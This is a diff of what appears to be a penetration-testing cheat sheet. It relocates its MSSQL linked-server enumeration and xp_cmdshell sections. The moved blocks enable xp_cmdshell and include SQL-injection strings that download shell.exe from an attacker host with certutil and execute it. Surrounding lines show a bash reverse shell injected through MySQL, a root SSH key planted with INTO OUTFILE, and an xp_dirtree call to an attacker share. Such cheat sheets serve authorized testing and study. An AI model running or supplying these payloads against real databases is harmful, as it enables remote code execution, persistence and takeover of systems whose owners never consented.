@@ -1981,6 +1981,39 @@ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
 ```
 
+##### Linked SQL Server Enumeration
+
+```c
+SQL> SELECT user_name();
+SQL> SELECT name,sysadmin FROM syslogins;
+SQL> SELECT srvname,isremote FROM sysservers;
+SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
+SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
+```
+
+##### xp_cmdshell
+
+```c
+SQL> EXEC sp_configure 'Show Advanced Options', 1;
+SQL> reconfigure;
+SQL> sp_configure;
+SQL> EXEC sp_configure 'xp_cmdshell', 1;
+SQL> reconfigure
+SQL> xp_cmdshell "whoami"
+```
+
+```c
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+```
+
+```c
+';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
+';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
+';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
+```
+
 #### MySQL
 
 ```c
@@ -2010,28 +2043,6 @@ mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_
 mysql> \! /bin/sh
 ```
 
-##### xp_cmdshell
-
-```c
-SQL> EXEC sp_configure 'Show Advanced Options', 1;
-SQL> reconfigure;
-SQL> sp_configure;
-SQL> EXEC sp_configure 'xp_cmdshell', 1;
-SQL> reconfigure
-SQL> xp_cmdshell "whoami"
-```
-
-```c
-SQL> enable_xp_cmdshell
-SQL> xp_cmdshell whoami
-```
-
-```c
-';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
-';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
-';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
-```
-
 ##### Insert Code to get executed
 
 ```c
@@ -2042,17 +2053,6 @@ mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >&
 
 ```c
 mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
-```
-
-##### Linked SQL Server Enumeration
-
-```c
-SQL> SELECT user_name();
-SQL> SELECT name,sysadmin FROM syslogins;
-SQL> SELECT srvname,isremote FROM sysservers;
-SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
-SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
 ```
 
 #### NoSQL Injection
